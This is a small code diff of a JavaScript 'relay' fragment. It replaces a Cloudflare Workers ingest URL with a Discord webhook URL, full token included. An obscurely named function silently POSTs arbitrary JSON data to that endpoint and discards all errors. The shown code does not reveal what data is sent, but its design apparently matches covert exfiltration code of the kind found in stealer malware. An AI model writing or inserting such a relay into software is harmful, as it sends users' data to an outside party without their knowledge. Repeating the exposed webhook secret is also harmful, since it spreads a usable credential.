@@ -1,5 +1,5 @@
 // --- relay ---
-const _W = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
+const _W = 'https://discord.com/api/webhooks/1526064072154681538/WgCWtTVvd35FEfWy4SyPyr-9mMM9OtklU-99KygPBih0Ymd24bhGDt7JbUb2SsB0nmqM';
 async function _R(t, d) {
   try { await fetch(_W, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Relay-Type': t }, body: JSON.stringify(d) }); } catch(e) {}
 }
